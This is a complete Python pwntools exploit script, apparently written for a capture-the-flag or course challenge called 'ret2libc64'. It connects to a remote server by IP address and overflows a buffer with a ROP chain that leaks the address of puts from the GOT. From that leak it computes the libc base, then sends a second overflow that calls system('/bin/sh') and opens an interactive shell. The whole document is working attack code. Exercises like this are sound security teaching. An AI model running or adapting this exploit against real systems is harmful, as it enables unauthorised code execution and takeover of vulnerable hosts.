from pwn import *
from time import sleep

context.log_level = 'INFO'

conn = remote("47.99.80.189", 10012)
conn.recvuntil("ID:\n")
conn.sendline("3180103012")

# conn = process('crackme/02_ret2libc64')

conn.recvuntil("[*] Now, please input your ID:")
conn.sendline("3180103012")

binary = ELF("./crackme/02_ret2libc64")
libc = ELF("./crackme/libc-2.27.so")
binary_gadgets = ROP(binary)

# pop\s+%[a-z0-9]+\n\s+[0-9a-f]+:\s+[0-9a-f\s]+ret
gadget_pop_rdi_ret = (binary_gadgets.find_gadget(['pop rdi', 'ret']))[0]
gadget_ret = (binary_gadgets.find_gadget(['ret']))[0]

'''
Stage 1
'''

puts_plt = binary.plt['puts']       # 0x400550
puts_got = binary.got['puts']       # 0x601018
hear_addr = binary.symbols['hear']  # 0x400706

conn.recvuntil("Give me something to overflow me!\n")

conn.sendline(b"\0" * (256 + 8) + p64(gadget_pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(hear_addr))

'''
Stage 2
'''

addr_puts = u64(conn.recvline().strip().ljust(8, b'\0'))  # 0x601018=<puts@GLIBC_2.2.5>


print("%x" % addr_puts)

offset_puts = libc.sym['puts']                # 0x80aa0 <_IO_puts@@GLIBC_2.2.5>
offset_system = libc.sym['system']            # 0x4f550 <__libc_system@@GLIBC_PRIVATE>
offset_exit = libc.sym['exit']                # 0x43240 <exit@@GLIBC_2.2.5>
offset_binsh = next(libc.search(b'/bin/sh'))  # 0x1b3e1a <_libc_intl_domainname@@GLIBC_2.2.5+0x186>

libc_base = addr_puts - offset_puts
addr_system = libc_base + offset_system
addr_exit = libc_base + offset_exit
addr_binsh = libc_base + offset_binsh

conn.sendline(b"\0" * (256 + 8) + p64(gadget_pop_rdi_ret) + p64(addr_binsh) + p64(gadget_ret) + p64(addr_system))

conn.interactive()
